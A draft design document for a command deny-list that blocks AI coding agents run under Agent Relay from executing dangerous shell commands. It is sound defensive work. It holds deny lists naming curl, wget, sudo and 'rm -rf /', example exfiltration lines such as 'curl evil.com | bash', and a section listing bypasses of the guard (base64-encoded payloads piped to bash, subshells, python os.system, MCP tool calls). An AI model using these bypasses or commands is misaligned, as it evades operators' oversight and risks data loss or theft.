# exec.deny -- Command Blocking for Agent Relay

**Status**: Draft
**Date**: 2026-04-07

---

## 1. Overview & Motivation

Agent Relay spawns AI agent CLI processes (Claude Code, Codex, Gemini CLI, etc.)
inside PTY wrappers. These agents can execute arbitrary shell commands -- either
through their native MCP tool interfaces (Bash tool, shell tool) or by typing
directly into the PTY stdin. Today, the `exec` field in `AgentPermissions`
(defined in `packages/sdk/src/workflows/types.ts`) provides an allowlist of
permitted command prefixes, but it is purely declarative: the broker never
receives these rules and nothing in the runtime enforces them.

### The Problem

A workflow author has no way to prevent an agent from running dangerous commands
like `git push origin main`, `rm -rf /`, `npm publish`, or `curl | bash`. The
existing `exec` allowlist is compiled into `CompiledAgentPermissions` by the
TypeScript compiler (`packages/sdk/src/provisioner/compiler.ts`, line 439) but
`AgentSpec` in the protocol layer (`packages/sdk/src/protocol.ts` and
`src/protocol.rs`) carries no permission fields whatsoever. The rules are lost at
the TypeScript/Rust boundary.

### The Solution

Add `exec.deny` rules that:

1. Flow from YAML config through the SDK compiler into the `AgentSpec` protocol
2. Are transmitted to the Rust broker with every spawn request
3. Are enforced at the PTY stdin boundary before bytes reach the child shell

### Why This Matters

1. **Safety by default** -- Workflow authors can protect production branches,
   prevent destructive file operations, and block exfiltration attempts.
2. **Compliance** -- Enterprise deployments need auditable command restrictions.
3. **Defense in depth** -- Even though bypass vectors exist (see Section 5),
   catching 80%+ of accidental execution is practically valuable.

### Why a Denylist (Not Just Allowlists)

Allowlists are brittle for general-purpose coding agents that may legitimately
need hundreds of commands. Denylists catch the high-value mistakes without
constraining general capability. Users who need tight control can combine both:
allow `git *` but deny `git push origin main`.

---

## 2. User-Facing API

### 2.1 YAML Schema: `exec.deny` Alongside Existing `exec` Allowlist

The `exec` field evolves from a flat string array to a structured object
supporting both `allow` and `deny`:

```yaml
# relay.yaml
version: '1'
name: safe-deploy

permission_profiles:
  safe-worker:
    access: readwrite
    exec:
      deny:
        - 'git push origin main'
        - 'git push origin master'
        - 'git push --force'
        - 'rm -rf /'
        - 'rm -rf ~'
        - 'npm publish'
        - 'curl'
        - 'wget'
        - 'chmod 777'
        - 'sudo'
      allow:
        - 'npm test'
        - 'npm run lint'
        - 'git diff'
        - 'git status'
        - 'git add'
        - 'git commit'
      on_deny: block # "block" (default), "warn", or "kill"

agents:
  - name: Worker
    cli: claude
    permissions:
      profile: safe-worker

  - name: Reviewer
    cli: claude
    permissions:
      access: readonly
      exec:
        deny:
          - 'git push'
          - 'rm -rf'
```

**Backward compatibility:** The existing `exec: string[]` shorthand continues to
work and is treated as `exec.allow`:

```yaml
# Old format (still works, treated as allow-only):
permissions:
  exec:
    - "npm test"
    - "npm run lint"

# Desugared internally to:
permissions:
  exec:
    allow:
      - "npm test"
      - "npm run lint"
```

### 2.2 Exec Rules Schema

```typescript
// Old format (still supported):
exec?: string[];

// New format:
exec?: string[] | ExecRules;

interface ExecRules {
  /** Commands the agent must never execute. Checked first (deny wins). */
  deny?: string[];
  /** Allowlist of commands the agent may execute. */
  allow?: string[];
  /** Behavior when a denied command is detected. Default: 'block'. */
  on_deny?: 'warn' | 'block' | 'kill';
}
```

**Resolution order:** Deny rules are checked first. If a command matches any
deny rule, it is blocked regardless of allow rules. If no deny rule matches and
an allow list exists, only commands matching the allow list are permitted. If
neither deny nor allow is set, all commands are permitted (current behavior).

### 2.3 Pattern Matching Syntax

Rules use prefix matching by default:

| Pattern       | Matches                                                | Does Not Match                 |
| ------------- | ------------------------------------------------------ | ------------------------------ |
| `git push`    | `git push`, `git push origin main`, `git push --force` | `git pull`, `git status`       |
| `rm -rf /`    | `rm -rf /`, `rm -rf /etc`                              | `rm file.txt`, `rm -rf ./temp` |
| `npm publish` | `npm publish`, `npm publish --access public`           | `npm test`                     |
| `sudo`        | `sudo rm`, `sudo apt install`                          | `visudo`                       |

Matching is case-insensitive and performed after whitespace normalization and
quote stripping.

### 2.4 `.agentdeny` Dotfile for `agent-relay on` (Wrap Mode)

For the interactive wrap mode (`agent-relay on` / `agent-relay claude`), there is
no YAML workflow. Users create a `.agentdeny` file at the project root, following
the same conventions as `.agentignore`:

```
# .agentdeny
# One deny pattern per line. Lines starting with # are comments.
# Blank lines are ignored.

# Block dangerous git operations
git push origin main
git push origin master
git push --force
git push -f

# Block destructive file operations
rm -rf /
rm -rf ~
rm -rf .

# Block package publishing
npm publish
cargo publish

# Block network exfiltration patterns
curl
wget
```

Per-agent dotfiles are also supported: `.$AGENT_NAME.agentdeny` (e.g.,
`.Worker.agentdeny`), analogous to the existing `.$AGENT_NAME.agentignore`
convention.

Resolution order for `agent-relay on`:

1. Load `.agentdeny` from the working directory
2. Load `.$AGENT_NAME.agentdeny` if it exists
3. Load `RELAY_EXEC_DENY` env var (comma-separated) if set
4. Load `--exec-deny` CLI flags if provided
5. Merge: union of all deny patterns

### 2.5 Error Messages When Blocked

When a command is blocked, the agent sees a clear error injected into the PTY
output:

```
[agent-relay] BLOCKED: Command "git push origin main" matches deny rule "git push origin main".
The command was not executed. If this is intentional, ask the user to update the exec.deny rules.
```

The blocked command is not forwarded to the PTY child process. A `\r\n` is
written so the shell prompt reappears cleanly.

The broker also emits a structured event:

```json
{
  "kind": "exec_denied",
  "name": "Worker",
  "command": "git push origin main",
  "pattern": "git push origin main",
  "action": "block"
}
```

---

## 3. Data Flow

How deny rules flow from configuration to enforcement:

```
relay.yaml                            .agentdeny
(workflow mode)                       (wrap mode)
    |                                      |
    v                                      v
SDK compiler                          dotfiles.ts loader
(compiler.ts)                         (new, alongside .agentignore)
    |                                      |
    v                                      v
CompiledAgentPermissions              Vec<String> deny rules
    |                                      |
    +---- exec_deny: string[] ----+        |
    |                             |        |
    v                             v        v
AgentSpec protocol             RELAY_EXEC_DENY env var
(protocol.ts + protocol.rs)    (passed to Rust binary)
    |                                      |
    v                                      v
spawn_agent message            run_wrap() in wrap.rs
    |                                      |
    v                                      v
WorkerRegistry::spawn()        ExecInterceptor initialized
(worker.rs)                    from env var / CLI args
    |
    v
PTY worker subprocess
(pty_worker.rs)
    |
    v
ExecInterceptor initialized
from init_worker payload
    |
    +------------------+-------------------+
                       |
                       v
              ExecFilter::check()
              (new: src/exec_filter.rs)
                       |
                       v
              pty.write_all(&data)
              GATED: only if command is allowed
```

### 3.1 Protocol Extension

The `AgentSpec` message gains optional exec fields.

**TypeScript** (`packages/sdk/src/protocol.ts`, current `AgentSpec` at lines 13-26):

```typescript
export interface AgentSpec {
  name: string;
  runtime: AgentRuntime;
  // ... existing fields ...
  exec_deny?: string[]; // NEW
  exec_allow?: string[]; // NEW
  exec_on_deny?: 'warn' | 'block' | 'kill'; // NEW
}
```

**Rust** (`src/protocol.rs`, current `AgentSpec` at lines 23-46):

```rust
pub struct AgentSpec {
    pub name: String,
    pub runtime: AgentRuntime,
    // ... existing fields ...
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub exec_deny: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub exec_allow: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub exec_on_deny: Option<String>,
}
```

Using `#[serde(default)]` ensures backward compatibility: older SDKs that do not
send these fields will deserialize to empty vectors / None.

### 3.2 Wrap Mode Data Flow

In wrap mode (`agent-relay on`), there is no broker/worker separation. The
`run_wrap()` function in `src/wrap.rs` directly manages the PTY:

1. `src/cli/commands/on/dotfiles.ts` reads `.agentdeny` (new, alongside existing
   `.agentignore` loading)
2. Rules are passed to the Rust binary via `RELAY_EXEC_DENY` environment variable
   (comma-separated)
3. `run_wrap()` initializes an `ExecInterceptor` from these rules
4. The stdin-to-PTY passthrough at `src/wrap.rs` lines 719-721 is gated:
   - Before: `let _ = pty.write_all(&data);`
   - After: `interceptor.feed(&data)` with conditional forwarding

### 3.3 Spawned Agent Data Flow

1. Workflow runner compiles `exec.deny` rules via `compiler.ts`
2. Rules are included in the `AgentSpec` sent via `spawn_agent` protocol message
3. `WorkerRegistry::spawn()` in `src/worker.rs` passes `exec_deny` as env var
   `RELAY_EXEC_DENY` to the child process
4. `run_pty_worker()` in `src/pty_worker.rs` initializes an `ExecInterceptor`
5. All `pty.write_all()` calls that inject agent-generated content (lines 750,
   766, 792, 802 in `pty_worker.rs`) are gated by the filter

---

## 4. Implementation Plan (Phased)

### Phase 1 -- MVP (estimated 3 days)

**Goal:** End-to-end plumbing with basic prefix matching and logging-only
enforcement. No commands are actually blocked yet.

#### 4.1.1 TypeScript Type Changes

**File:** `packages/sdk/src/workflows/types.ts`

- Add `ExecRules` interface
- Change `exec` field on `AgentPermissions` (line 304) and
  `PermissionProfileDefinition` (line 251) from `exec?: string[]` to
  `exec?: string[] | ExecRules`
- Update `isRestrictedAgent()` (line 407) to detect deny rules
- Add `execDeny?: string[]` and `execOnDeny?: string` to
  `CompiledAgentPermissions` (around line 366)

**File:** `packages/sdk/src/protocol.ts`

- Add `exec_deny?: string[]`, `exec_allow?: string[]`, and
  `exec_on_deny?: 'warn' | 'block' | 'kill'` to `AgentSpec` (line 13)

#### 4.1.2 Compiler Changes

**File:** `packages/sdk/src/provisioner/compiler.ts`

- Add normalization function to handle `string[] | ExecRules` union
- Update `compileAgentPermissions()` (line 340) to produce `execDeny` and
  `execOnDeny` on the compiled output
- Update existing `exec` compilation (line 439: `exec: permissions.exec ? [...permissions.exec] : undefined`)
  to handle the new format

#### 4.1.3 Rust Protocol Changes

**File:** `src/protocol.rs`

- Add `exec_deny`, `exec_allow`, `exec_on_deny` to `AgentSpec` struct (line 23)
- Add `ExecDenied` variant to `BrokerEvent` enum (line 149)
- Update round-trip tests to cover new fields

#### 4.1.4 New Exec Filter Module

**New file:** `src/exec_filter.rs`

```rust
/// Holds compiled exec deny/allow rules for a single agent.
#[derive(Debug, Clone, Default)]
pub struct ExecFilter {
    deny_prefixes: Vec<String>,   // lowercased
    allow_prefixes: Vec<String>,  // lowercased
    on_deny: DenyAction,
}

#[derive(Debug, Clone, Default)]
pub enum DenyAction {
    Warn,
    #[default]
    Block,
    Kill,
}

#[derive(Debug)]
pub enum ExecVerdict {
    Allow,
    Deny { pattern: String },
}

/// Buffers partial stdin input and checks complete lines against rules.
#[derive(Debug)]
pub struct ExecInterceptor {
    filter: ExecFilter,
    line_buffer: Vec<u8>,
}

pub struct InterceptResult {
    /// Bytes that should be forwarded to pty.write_all()
    pub allowed_bytes: Vec<u8>,
    /// Commands that were denied
    pub denied: Vec<DeniedCommand>,
}

pub struct DeniedCommand {
    pub command: String,
    pub pattern: String,
}
```

**File:** `src/lib.rs`

- Add `pub mod exec_filter;`

#### 4.1.5 Thread Deny Rules Through Worker Spawning

**File:** `src/worker.rs`

In `WorkerRegistry::spawn()` (line 133), after setting up environment variables
(around line 308), add:

```rust
if !spec.exec_deny.is_empty() {
    command.env("RELAY_EXEC_DENY", spec.exec_deny.join(","));
}
```

**File:** `src/pty_worker.rs`

In `run_pty_worker()` (line 164), read deny rules from environment:

```rust
let exec_deny: Vec<String> = std::env::var("RELAY_EXEC_DENY")
    .ok()
    .map(|v| v.split(',').map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect())
    .unwrap_or_default();
let exec_interceptor = if exec_deny.is_empty() {
    None
} else {
    Some(ExecInterceptor::new(ExecFilter::new(Some(exec_deny), None, None)))
};
```

#### 4.1.6 Basic PTY Interception (Logging Only)

**File:** `src/wrap.rs`, lines 718-721

Replace:

```rust
// Stdin -> PTY (passthrough)
Some(data) = stdin_rx.recv() => {
    let _ = pty.write_all(&data);
}
```

With:

```rust
Some(data) = stdin_rx.recv() => {
    if let Some(ref mut interceptor) = exec_interceptor {
        let result = interceptor.feed(&data);
        // Phase 1: log violations but still forward everything
        for denied in &result.denied {
            tracing::warn!(
                command = %denied.command,
                pattern = %denied.pattern,
                "exec.deny: command would be blocked"
            );
        }
        let _ = pty.write_all(&data); // still passthrough in Phase 1
    } else {
        let _ = pty.write_all(&data);
    }
}
```

Same pattern applied to `src/pty_worker.rs` at injection points.

#### 4.1.7 Phase 1 Deliverable

At the end of Phase 1:

- Exec deny rules flow end-to-end from YAML/dotfile to PTY interception
- Matching deny rules produce structured `tracing::warn!` log entries
- Events are emitted so the SDK/TUI can display violations
- No commands are actually blocked (safe to ship and gather data on false positives)

---

### Phase 2 -- Shell Awareness (estimated 2 days)

**Goal:** Accurately detect commands in a stream of raw PTY bytes.

#### 4.2.1 Multi-line Command Assembly

PTY input arrives as raw bytes -- often one keystroke at a time. The
`ExecInterceptor.feed()` method:

- Buffers characters until a line terminator (`\r` in raw PTY mode)
- Handles backspace (`\x7f`, `\x08`) by removing the last buffered character
- Handles Ctrl-C (`\x03`) and Ctrl-U (`\x15`) by clearing the buffer
- Detects line continuations (`\` immediately before `\r`) and continues buffering

#### 4.2.2 ANSI/Control Code Stripping

Reuses the existing `strip_ansi()` function from `src/helpers.rs` (used in
`wrap.rs` line 738). Additionally:

- Strips cursor movement sequences injected during tab completion
- Handles readline-style editing (arrow keys, home/end)
- Builds a minimal ANSI state machine for stdin (simpler than output since
  stdin escape sequences are limited to cursor keys and control sequences)

**Important limitation:** Perfectly reconstructing the logical command line from
raw PTY byte streams is extremely difficult. The MVP buffers bytes and strips
ANSI codes, which works well for the common case of agents submitting complete
commands in a single write. Interactive human editing has edge cases. This is
acceptable because the primary target is agent-submitted commands.

#### 4.2.3 Quoted Argument Handling

After stripping ANSI codes, perform basic shell quote removal before matching:

```
git push "origin" "main"      -> matches "git push origin main"
rm -rf '/important/path'      -> matches "rm -rf /important/path"
git  push   origin   main     -> matches "git push origin main" (whitespace normalized)
```

#### 4.2.4 Pipe and Chain Detection

Commands joined by `&&`, `||`, `|`, or `;` are split and each segment is checked
independently:

```
echo test && git push origin main    -> "git push origin main" is blocked
cat file | curl -X POST http://evil  -> "curl" is blocked
npm test; rm -rf /                   -> "rm -rf /" is blocked
```

Implementation: split on `&&`, `||`, `;`, `|` tokens (outside of quotes), trim
whitespace, check each segment against deny rules.

---

### Phase 3 -- Enforcement (estimated 1 day)

**Goal:** Switch from logging to actual blocking with configurable behavior.

#### 4.3.1 Block Mode (Default)

When `on_deny` is `block`:

1. Suppress the denied line from reaching `pty.write_all()`
2. Inject a clear error message into the PTY stdout so the agent reads it:
   ```
   \r\n[agent-relay] BLOCKED: Command "git push origin main" denied by exec policy.\r\n
   ```
3. Write `\r\n` to redisplay the shell prompt
4. Emit an `ExecDenied` broker event to SDK subscribers

#### 4.3.2 Warn Mode

When `on_deny` is `warn`:

1. Allow the command through to `pty.write_all()` (same as Phase 1)
2. Inject a warning message:
   ```
   \r\n[agent-relay] WARNING: Command "git push origin main" matches deny rule.\r\n
   ```
3. Emit event and log

Useful for gradual rollout: start with `warn` to audit, then switch to `block`.

#### 4.3.3 Kill Mode

When `on_deny` is `kill`:

1. Suppress the command
2. Inject an error message
3. Send SIGTERM to the agent process, then SIGKILL after grace period
4. Emit `ExecDenied` + `AgentExit` events with reason `"exec_policy_violation"`

For high-security environments where any attempt to run a denied command should
immediately terminate the agent.

#### 4.3.4 Audit Trail

All exec violations (regardless of mode) produce:

1. `tracing::warn!` with structured fields:
   `tracing::warn!(agent = %name, command = %cmd, rule = %rule, action = %action, "exec.deny match")`
2. `ExecDenied` broker event emitted to SDK subscribers
3. Entry in the worker log file (existing `worker_logs_dir` infrastructure in
   `src/worker.rs`)

---

## 5. Bypass Vectors & Limitations

This section honestly documents what exec.deny can and cannot catch. This is a
best-effort guardrail, not a security sandbox.

### What It Catches

| Vector                                       | Caught? | Notes                                     |
| -------------------------------------------- | ------- | ----------------------------------------- |
| Direct command: `git push origin main`       | Yes     | Prefix match on assembled line            |
| Chained: `test && git push origin main`      | Yes     | Phase 2 splits on `&&`, `\|\|`, `\|`, `;` |
| Multi-write: command split across PTY writes | Yes     | Line buffer assembles before checking     |
| Quoted args: `git push 'origin' "main"`      | Yes     | Quote stripping before match              |
| Extra whitespace: `git  push  origin  main`  | Yes     | Whitespace normalization                  |
| Background: `git push origin main &`         | Yes     | `&` is stripped before matching           |

### What It Does NOT Catch

| Vector                                                           | Caught? | Why                                                           |
| ---------------------------------------------------------------- | ------- | ------------------------------------------------------------- |
| `echo "git push" \| bash`                                        | No      | Requires shell interpretation                                 |
| `$(git push origin main)`                                        | No      | Subshell execution                                            |
| Aliases: `alias gp='git push origin main'; gp`                   | No      | Alias resolution is shell-internal                            |
| Encoded: `echo Z2l0IHB1c2g= \| base64 -d \| bash`                | No      | Encoded payload                                               |
| Compiled binary: `./my-pusher`                                   | No      | Binary calls execve() internally                              |
| Language runtime: `python -c "import os; os.system('git push')"` | No      | Interpreter execution                                         |
| MCP tool calls (Bash tool, shell tool)                           | No      | MCP executes inside agent process; broker has zero visibility |
| SSH: `ssh remote "git push"`                                     | No      | Tunneled execution                                            |
| `xargs`, `find -exec`                                            | No      | Indirect execution                                            |

### Why This Is Still Valuable

1. **Catches 80-90% of accidental execution.** AI agents predominantly issue
   straightforward shell commands. They do not typically encode or obfuscate.

2. **Raises the bar.** An agent would have to actively work around restrictions,
   which well-designed agents following their system prompts will not do.

3. **Audit trail.** Even in warn mode, violations are logged and surfaced in the
   TUI, providing observability into agent behavior.

4. **Layered defense.** Works alongside file permissions (relayfile), network
   restrictions, and access presets. No single layer needs to be perfect.

5. **Norms over walls.** Like `.gitignore`, the value is in establishing norms
   and catching accidents, not cryptographic security guarantees.

---

## 6. Files to Modify

### New Files

| File                 | Description                                                                             |
| -------------------- | --------------------------------------------------------------------------------------- |
| `src/exec_filter.rs` | Core exec filtering module: ExecFilter, ExecInterceptor, command parsing, rule matching |

### Modified Files -- Rust

| File                | Change                                                                                                                                                                                |
| ------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `src/lib.rs`        | Add `pub mod exec_filter;` to module list (line 1+)                                                                                                                                   |
| `src/protocol.rs`   | Add `exec_deny: Vec<String>`, `exec_allow: Vec<String>`, `exec_on_deny: Option<String>` to `AgentSpec` (line 23). Add `ExecDenied` variant to `BrokerEvent` (line 149). Update tests. |
| `src/wrap.rs`       | Initialize `ExecInterceptor` from env var. Gate `stdin_rx.recv() => pty.write_all(&data)` at line 719-721 through `interceptor.feed()`.                                               |
| `src/pty_worker.rs` | Initialize `ExecInterceptor` from `RELAY_EXEC_DENY` env var. Gate `pty.write_all()` injection calls at lines 750, 766, 792, 802.                                                      |
| `src/worker.rs`     | In `WorkerRegistry::spawn()` (line 133), pass `spec.exec_deny` to child via `RELAY_EXEC_DENY` env var (around line 308).                                                              |
| `src/main.rs`       | Add `--exec-deny` CLI argument to the `pty` subcommand for wrap mode.                                                                                                                 |

### Modified Files -- TypeScript

| File                                       | Change                                                                                                                                                                                                                                                                                                            |
| ------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `packages/sdk/src/workflows/types.ts`      | Add `ExecRules` interface. Change `exec` field type on `AgentPermissions` (line 304) and `PermissionProfileDefinition` (line 251) from `string[]` to `string[] \| ExecRules`. Add `execDeny?: string[]`, `execOnDeny?: string` to `CompiledAgentPermissions` (line 366). Update `isRestrictedAgent()` (line 407). |
| `packages/sdk/src/protocol.ts`             | Add `exec_deny?: string[]`, `exec_allow?: string[]`, `exec_on_deny?: string` to `AgentSpec` interface (line 13).                                                                                                                                                                                                  |
| `packages/sdk/src/provisioner/compiler.ts` | Add `normalizeExecRules()` helper. Update `compileAgentPermissions()` (line 340) to compile deny/allow lists and `on_deny` mode. Update existing exec compilation (line 439).                                                                                                                                     |
| `packages/sdk/src/provisioner/types.ts`    | Add `execDeny?: string[]` and `execOnDeny?: string` to `CompiledAgentPermissions` interface.                                                                                                                                                                                                                      |
| `src/cli/commands/on/dotfiles.ts`          | Add `.agentdeny` loading alongside existing `.agentignore` loading. Same pattern: read file, clean lines, return array of patterns.                                                                                                                                                                               |
| `src/cli/commands/on/start.ts`             | Pass loaded deny rules to the Rust binary via `RELAY_EXEC_DENY` env var.                                                                                                                                                                                                                                          |
| `packages/sdk/src/workflows/schema.json`   | Update exec field schema to accept object form with `deny`, `allow`, `on_deny` properties.                                                                                                                                                                                                                        |
| `packages/sdk/src/workflows/runner.ts`     | Thread `exec_deny` and `exec_allow` from compiled permissions into `AgentSpec` when spawning agents.                                                                                                                                                                                                              |

### Configuration / Documentation

| File                               | Change                                                                             |
| ---------------------------------- | ---------------------------------------------------------------------------------- |
| `web/content/docs/permissions.mdx` | Document `exec.deny`, `.agentdeny` dotfile, enforcement modes, bypass limitations. |
| `docs/permissions.md`              | Mirror of above (per docs-sync rule).                                              |

---

## 7. Testing Strategy

### 7.1 Unit Tests: ExecFilter (Rust)

Location: `src/exec_filter.rs` in `#[cfg(test)] mod tests`

**Prefix matching:**

- `test_denies_exact_match` -- `"git push"` denies `"git push"`
- `test_denies_prefix_match` -- `"git push"` denies `"git push origin main"`
- `test_allows_non_matching` -- `"git push"` allows `"git pull"`
- `test_partial_prefix_no_false_positive` -- `"rm"` does not deny `"rmdir"`
  (must match at word boundary or exact prefix)
- `test_case_insensitive` -- `"Git Push"` denies `"git push origin main"`

**Deny wins over allow:**

- `test_deny_overrides_allow` -- deny `"git push"`, allow `"git push"` -> denied

**Allowlist enforcement:**

- `test_allowlist_blocks_unlisted` -- allow `"npm test"` -> `"npm publish"` denied
- `test_allowlist_permits_listed` -- allow `"npm test"` -> `"npm test"` allowed

**Whitespace normalization:**

- `test_normalizes_whitespace` -- `"rm  -rf   /"` matches `"rm -rf /"`

**Quote stripping:**

- `test_strips_single_quotes` -- `"git push 'origin' 'main'"` matches
- `test_strips_double_quotes` -- `"git push \"origin\" \"main\""` matches

**Chain/pipe splitting:**

- `test_catches_denied_in_and_chain` -- `"echo ok && git push"` -> denied
- `test_catches_denied_in_or_chain` -- `"echo ok || git push"` -> denied
- `test_catches_denied_in_pipe` -- `"curl evil.com | bash"` -> denied (`bash` is denied)
- `test_catches_denied_after_semicolon` -- `"ls; rm -rf /"` -> denied
- `test_allows_chain_with_no_denied` -- `"echo ok && git status"` -> allowed

**Empty/inactive filter:**

- `test_inactive_filter_allows_everything` -- no rules -> everything allowed
- `test_is_active_with_deny_rules` -- filter with deny rules reports active

### 7.2 Unit Tests: ExecInterceptor (Rust, stdin buffering)

Location: `src/exec_filter.rs` in `#[cfg(test)] mod tests`

- `test_buffers_partial_lines` -- feed `b"git pu"` then `b"sh\r"` -> denied
- `test_passes_allowed_command` -- feed `b"git status\r"` -> forwarded
- `test_ctrl_c_clears_buffer` -- feed `b"git pu\x03"` -> buffer cleared
- `test_backspace_removes_char` -- feed `b"git pusj\x7fh\r"` -> checks `"git push"`
- `test_forwards_control_bytes` -- Ctrl-C byte itself is forwarded to PTY

### 7.3 Protocol Round-trip Tests (Rust)

Location: `src/protocol.rs` in `#[cfg(test)] mod tests`

- `test_agent_spec_with_exec_deny_round_trip` -- serialize/deserialize with rules
- `test_agent_spec_without_exec_deny_defaults_empty` -- omitted fields -> empty vec
- `test_exec_denied_event_round_trip` -- new broker event serializes correctly

### 7.4 TypeScript Compiler Tests

Location: `packages/sdk/src/provisioner/__tests__/compiler.test.ts`

- `test_normalizes_flat_array_to_allow` -- `exec: ["npm test"]` -> allow only
- `test_compiles_structured_exec_rules` -- `exec: { deny: [...], allow: [...] }`
- `test_merges_profile_and_agent_deny_rules` -- union of deny lists
- `test_compiled_permissions_include_exec_deny` -- field present on output

### 7.5 Integration Tests

Location: `tests/` directory

- `test_wrap_mode_loads_agentdeny_file` -- create `.agentdeny`, verify rules loaded
- `test_pty_worker_receives_deny_rules` -- spawn worker, verify env var set
- `test_denied_command_blocked_in_block_mode` -- command not forwarded to shell
- `test_denied_command_allowed_in_warn_mode` -- command forwarded with warning
- `test_block_message_injected_into_pty` -- agent sees error message

### 7.6 Bypass Regression Tests

Location: `src/exec_filter.rs` or `tests/exec_filter_bypass.rs`

These document known limitations, not failures:

- `test_pipe_to_bash_not_caught` -- `"echo 'git push' | bash"` is NOT caught
  (expected: `ExecVerdict::Allow` for the `echo` segment)
- `test_subshell_not_caught` -- `"$(git push)"` is NOT caught
- `test_python_os_system_not_caught` -- language runtime bypass

These tests are marked `#[ignore]` if they represent future improvement targets,
or left as positive assertions of current behavior (documenting what is
intentionally not caught).

---

## 8. Configuration Precedence

When multiple sources define exec rules, they merge as follows:

1. `.agentdeny` dotfile (lowest priority)
2. `.$AGENT_NAME.agentdeny` per-agent dotfile
3. Permission profile exec rules (from `permission_profiles`)
4. Agent-level exec rules (from `agents[].permissions.exec`)
5. CLI flags / environment variables (highest priority, wrap mode only)

**Merge behavior:**

- **Deny lists:** Unioned (all deny rules from all sources apply)
- **Allow lists:** Intersected (a command must be allowed by all sources that
  define an allow list)
- **`on_deny`:** Strictest value wins (`kill` > `block` > `warn`)

---

## 9. Open Questions

1. **Should exec.deny ship with a default deny list?** Providing defaults like
   `rm -rf /` and `sudo` would improve safety out of the box but could surprise
   users. Recommendation: off by default, with a recommended list in
   documentation.

2. **Should deny rules support glob/regex?** Initial implementation uses prefix
   matching for simplicity and performance. Glob support (e.g., `git push origin *`)
   could be added later. Regex is likely overkill for most use cases.

3. **Should `.agentdeny` be global (`~/.agentdeny`) in addition to per-project?**
   A global denylist could provide baseline safety across all projects.
   Recommendation: support both, with project-level additions merged on top.

4. **How should exec.deny interact with `--dangerously-skip-permissions`?**
   The broker auto-injects this flag for spawned agents (`src/worker.rs` line
   182). exec.deny should remain active regardless -- it is a relay-level
   restriction, not a CLI-level permission flag.

5. **Performance impact of stdin buffering?** Buffering every keystroke adds one
   copy per line. For agents that submit complete commands in bulk writes, the
   overhead is negligible. For interactive human typing in wrap mode, this should
   be benchmarked but is unlikely to be perceptible.

6. **Rate limiting on violations?** If an agent repeatedly attempts blocked
   commands, should there be automatic escalation from `warn` to `block` to
   `kill`? This would prevent infinite retry loops.

---

## 10. Future Work

- **MCP tool interception**: The biggest gap. Would require either modifying the
  MCP server to check exec rules before executing tool calls, or running a proxy
  MCP server.
- **File content inspection**: Scan script files before `bash script.sh`.
- **Network-layer enforcement**: Complement exec.deny with iptables/nftables for
  the agent's process group.
- **Centralized policy server**: Pull exec rules from a remote service for
  fleet-wide management.
- **TUI violation dashboard**: Show live exec violation counts per agent in the
  terminal UI.
